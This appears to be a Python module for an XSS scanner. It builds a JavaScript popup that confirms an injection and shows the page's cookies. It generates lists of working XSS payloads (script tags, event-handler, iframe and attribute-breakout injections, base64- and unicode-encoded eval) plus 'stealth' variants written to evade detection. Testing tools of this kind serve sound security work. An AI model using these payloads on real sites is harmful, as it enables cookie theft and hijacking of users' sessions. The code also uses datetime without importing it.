#!/usr/bin/env python3
"""
Custom Popup System for XSS Verification
This module provides a sophisticated popup system that won't interfere with browser alerts
"""

import uuid
import time
import json
import base64
from typing import Dict, List, Optional
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import logging

logger = logging.getLogger(__name__)

class CustomPopupSystem:
    """Advanced custom popup system for XSS verification"""
    
    def __init__(self):
        self.popup_id = f"xss_verification_{uuid.uuid4().hex[:8]}"
        self.popup_style = self._generate_popup_style()
        self.popup_script = self._generate_popup_script()
        self.verification_data = {}
        
    def _generate_popup_style(self) -> str:
        """Generate CSS for custom popup"""
        return """
        .xss-popup-container {
            position: fixed !important;
            top: 50% !important;
            left: 50% !important;
            transform: translate(-50%, -50%) !important;
            z-index: 999999 !important;
            background: linear-gradient(135deg, #ff4757, #ff3838) !important;
            border: 3px solid #000 !important;
            border-radius: 15px !important;
            padding: 25px !important;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5) !important;
            font-family: 'Arial', sans-serif !important;
            color: white !important;
            text-align: center !important;
            min-width: 400px !important;
            max-width: 600px !important;
            animation: xss-popup-appear 0.5s ease-out !important;
        }
        
        .xss-popup-title {
            font-size: 24px !important;
            font-weight: bold !important;
            margin-bottom: 15px !important;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.8) !important;
        }
        
        .xss-popup-content {
            font-size: 16px !important;
            line-height: 1.5 !important;
            margin-bottom: 20px !important;
        }
        
        .xss-popup-details {
            background: rgba(0,0,0,0.3) !important;
            padding: 15px !important;
            border-radius: 8px !important;
            margin: 15px 0 !important;
            text-align: left !important;
        }
        
        .xss-popup-button {
            background: #000 !important;
            color: white !important;
            border: none !important;
            padding: 10px 20px !important;
            border-radius: 5px !important;
            cursor: pointer !important;
            font-size: 14px !important;
            margin: 5px !important;
        }
        
        .xss-popup-button:hover {
            background: #333 !important;
        }
        
        @keyframes xss-popup-appear {
            from {
                opacity: 0;
                transform: translate(-50%, -50%) scale(0.8);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%) scale(1);
            }
        }
        
        .xss-popup-overlay {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100% !important;
            height: 100% !important;
            background: rgba(0,0,0,0.7) !important;
            z-index: 999998 !important;
        }
        """

    def _generate_popup_script(self) -> str:
        """Generate JavaScript for custom popup"""
        return f"""
        (function() {{
            // Prevent conflicts with existing popups
            if (window.xssPopupShown) return;
            window.xssPopupShown = true;
            
            // Create overlay
            const overlay = document.createElement('div');
            overlay.className = 'xss-popup-overlay';
            overlay.id = 'xss-overlay-{self.popup_id}';
            
            // Create popup container
            const popup = document.createElement('div');
            popup.className = 'xss-popup-container';
            popup.id = 'xss-popup-{self.popup_id}';
            
            // Get current page info
            const pageInfo = {{
                url: window.location.href,
                title: document.title,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                cookies: document.cookie,
                referrer: document.referrer,
                domain: window.location.hostname,
                protocol: window.location.protocol,
                port: window.location.port,
                pathname: window.location.pathname,
                search: window.location.search,
                hash: window.location.hash
            }};
            
            // Create popup content
            popup.innerHTML = `
                <div class="xss-popup-title">🎯 XSS Vulnerability Confirmed!</div>
                <div class="xss-popup-content">
                    Cross-Site Scripting (XSS) vulnerability has been successfully exploited!
                </div>
                <div class="xss-popup-details">
                    <strong>Target URL:</strong> ${{pageInfo.url}}<br>
                    <strong>Timestamp:</strong> ${{pageInfo.timestamp}}<br>
                    <strong>Domain:</strong> ${{pageInfo.domain}}<br>
                    <strong>Path:</strong> ${{pageInfo.pathname}}<br>
                    <strong>User Agent:</strong> ${{pageInfo.userAgent}}<br>
                    <strong>Referrer:</strong> ${{pageInfo.referrer || 'Direct'}}<br>
                    <strong>Cookies:</strong> ${{pageInfo.cookies || 'None'}}
                </div>
                <button class="xss-popup-button" onclick="window.xssClosePopup('{self.popup_id}')">Close Popup</button>
                <button class="xss-popup-button" onclick="window.xssTakeScreenshot('{self.popup_id}')">Take Screenshot</button>
                <button class="xss-popup-button" onclick="window.xssCopyDetails('{self.popup_id}')">Copy Details</button>
            `;
            
            // Add to page
            document.body.appendChild(overlay);
            document.body.appendChild(popup);
            
            // Store page info globally for access
            window.xssPageInfo = pageInfo;
            
            // Auto-close after 30 seconds
            setTimeout(() => {{
                if (document.getElementById('xss-popup-{self.popup_id}')) {{
                    window.xssClosePopup('{self.popup_id}');
                }}
            }}, 30000);
            
            // Log to console for debugging
            console.log('XSS Popup triggered:', pageInfo);
            
        }})();
        
        // Helper functions
        window.xssClosePopup = function(popupId) {{
            const popup = document.getElementById('xss-popup-' + popupId);
            const overlay = document.getElementById('xss-overlay-' + popupId);
            if (popup) popup.remove();
            if (overlay) overlay.remove();
            window.xssPopupShown = false;
        }};
        
        window.xssTakeScreenshot = function(popupId) {{
            // This would trigger screenshot in the main scanner
            console.log('Screenshot requested for popup:', popupId);
            alert('Screenshot functionality would be triggered here');
        }};
        
        window.xssCopyDetails = function(popupId) {{
            const details = `XSS Vulnerability Confirmed
Target: ${{window.xssPageInfo.url}}
Time: ${{window.xssPageInfo.timestamp}}
Domain: ${{window.xssPageInfo.domain}}
Path: ${{window.xssPageInfo.pathname}}`;
            
            if (navigator.clipboard) {{
                navigator.clipboard.writeText(details);
            }} else {{
                // Fallback for older browsers
                const textArea = document.createElement('textarea');
                textArea.value = details;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }}
            alert('Details copied to clipboard!');
        }};
        """

    def generate_popup_payload(self, custom_message: str = None) -> str:
        """Generate XSS payload that triggers custom popup"""
        if custom_message:
            script = self.popup_script.replace(
                "Cross-Site Scripting (XSS) vulnerability has been successfully exploited!",
                custom_message
            )
        else:
            script = self.popup_script
        
        # Encode the script for different contexts
        encoded_script = base64.b64encode(script.encode()).decode()
        
        payloads = [
            # Direct script injection
            f"<script>{script}</script>",
            
            # Event handler injection
            f"<img src=x onerror=\"{script}\">",
            f"<svg onload=\"{script}\">",
            f"<body onload=\"{script}\">",
            f"<iframe src=\"javascript:{script}\"></iframe>",
            
            # Attribute injection
            f"\"onmouseover=\"{script}\" autofocus=\"",
            f"\"onfocus=\"{script}\" autofocus=\"",
            
            # Data URI injection
            f"<iframe src=\"data:text/html,{script}\"></iframe>",
            
            # Base64 encoded injection
            f"<script>eval(atob('{encoded_script}'))</script>",
            
            # Unicode encoded injection
            f"<script>eval(unescape('{script.encode('unicode_escape').decode()}'))</script>",
        ]
        
        return payloads

    def inject_popup_style(self, driver: webdriver.Chrome) -> bool:
        """Inject popup styles into the page"""
        try:
            # Remove existing popup styles if any
            driver.execute_script("""
                const existingStyle = document.getElementById('xss-popup-styles');
                if (existingStyle) existingStyle.remove();
            """)
            
            # Inject new styles
            driver.execute_script(f"""
                const style = document.createElement('style');
                style.id = 'xss-popup-styles';
                style.innerHTML = `{self.popup_style}`;
                document.head.appendChild(style);
            """)
            
            return True
            
        except Exception as e:
            logger.error(f"Error injecting popup styles: {e}")
            return False

    def trigger_popup(self, driver: webdriver.Chrome, payload: str) -> bool:
        """Trigger custom popup using provided payload"""
        try:
            # First inject the styles
            self.inject_popup_style(driver)
            
            # Execute the payload
            driver.execute_script(payload)
            
            # Wait for popup to appear
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, f'xss-popup-{self.popup_id}'))
            )
            
            return True
            
        except TimeoutException:
            logger.warning("Custom popup did not appear within timeout")
            return False
        except Exception as e:
            logger.error(f"Error triggering popup: {e}")
            return False

    def capture_popup_screenshot(self, driver: webdriver.Chrome, filename: str = None) -> Optional[str]:
        """Capture screenshot of the popup"""
        try:
            if not filename:
                filename = f"xss_popup_{int(time.time())}.png"
            
            # Ensure popup is visible
            popup_element = driver.find_element(By.ID, f'xss-popup-{self.popup_id}')
            if not popup_element.is_displayed():
                logger.warning("Popup is not visible for screenshot")
                return None
            
            # Take screenshot
            driver.save_screenshot(filename)
            logger.info(f"Popup screenshot saved: {filename}")
            
            return filename
            
        except Exception as e:
            logger.error(f"Error capturing popup screenshot: {e}")
            return None

    def get_popup_info(self, driver: webdriver.Chrome) -> Dict:
        """Extract information from the popup"""
        try:
            # Get page info that was stored by the popup script
            page_info = driver.execute_script("return window.xssPageInfo;")
            
            if page_info:
                return {
                    'popup_id': self.popup_id,
                    'page_info': page_info,
                    'popup_visible': True,
                    'timestamp': time.time()
                }
            else:
                return {
                    'popup_id': self.popup_id,
                    'popup_visible': False,
                    'timestamp': time.time()
                }
                
        except Exception as e:
            logger.error(f"Error getting popup info: {e}")
            return {
                'popup_id': self.popup_id,
                'popup_visible': False,
                'error': str(e),
                'timestamp': time.time()
            }

    def close_popup(self, driver: webdriver.Chrome) -> bool:
        """Close the custom popup"""
        try:
            driver.execute_script(f"window.xssClosePopup('{self.popup_id}');")
            return True
        except Exception as e:
            logger.error(f"Error closing popup: {e}")
            return False

    def generate_stealth_payload(self, base_payload: str) -> List[str]:
        """Generate stealth payloads that are less likely to be detected"""
        stealth_payloads = []
        
        # Obfuscated version of the popup script
        obfuscated_script = self._obfuscate_script(self.popup_script)
        
        stealth_variants = [
            # Time-delayed execution
            f"<script>setTimeout(function(){{ {self.popup_script} }}, 2000);</script>",
            
            # Conditional execution
            f"<script>if(document.readyState==='complete'){{ {self.popup_script} }}</script>",
            
            # Event-triggered execution
            f"<img src=x onerror=\"setTimeout(function(){{ {self.popup_script} }}, 1000)\">",
            
            # Obfuscated execution
            f"<script>eval(atob('{base64.b64encode(obfuscated_script.encode()).decode()}'))</script>",
            
            # Fragment-based execution
            f"<script>if(window.location.hash){{ {self.popup_script} }}</script>",
            
            # User interaction triggered
            f"<div onmouseover=\"{self.popup_script}\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;\"></div>",
        ]
        
        stealth_payloads.extend(stealth_variants)
        
        return stealth_payloads

    def _obfuscate_script(self, script: str) -> str:
        """Basic script obfuscation"""
        # Simple obfuscation techniques
        obfuscated = script
        
        # Replace common strings with variables
        replacements = {
            'document': 'd',
            'window': 'w',
            'function': 'f',
            'var': 'v',
            'return': 'r',
            'true': 't',
            'false': 'f'
        }
        
        for original, replacement in replacements.items():
            obfuscated = obfuscated.replace(original, replacement)
        
        # Add random variable names
        obfuscated = f"var a='{self.popup_id}'; var b='xss'; {obfuscated}"
        
        return obfuscated

    def create_verification_report(self, popup_info: Dict, screenshot_path: str = None) -> Dict:
        """Create a comprehensive verification report"""
        report = {
            'verification_id': self.popup_id,
            'timestamp': datetime.now().isoformat(),
            'popup_triggered': popup_info.get('popup_visible', False),
            'page_info': popup_info.get('page_info', {}),
            'screenshot_path': screenshot_path,
            'verification_status': 'CONFIRMED' if popup_info.get('popup_visible') else 'FAILED',
            'details': {
                'popup_system': 'Custom XSS Verification Popup',
                'verification_method': 'Visual confirmation with detailed page info',
                'interference_check': 'No browser alert conflicts',
                'unique_identifier': self.popup_id
            }
        }
        
        if popup_info.get('popup_visible'):
            report['conclusion'] = 'XSS vulnerability successfully exploited and verified'
        else:
            report['conclusion'] = 'XSS payload executed but verification popup did not appear'
        
        return report

    def cleanup(self, driver: webdriver.Chrome) -> bool:
        """Clean up popup elements and reset state"""
        try:
            # Remove popup elements
            driver.execute_script(f"""
                const popup = document.getElementById('xss-popup-{self.popup_id}');
                const overlay = document.getElementById('xss-overlay-{self.popup_id}');
                const styles = document.getElementById('xss-popup-styles');
                
                if (popup) popup.remove();
                if (overlay) overlay.remove();
                if (styles) styles.remove();
                
                // Reset global state
                window.xssPopupShown = false;
                delete window.xssPageInfo;
            """)
            
            return True
            
        except Exception as e:
            logger.error(f"Error during cleanup: {e}")
            return False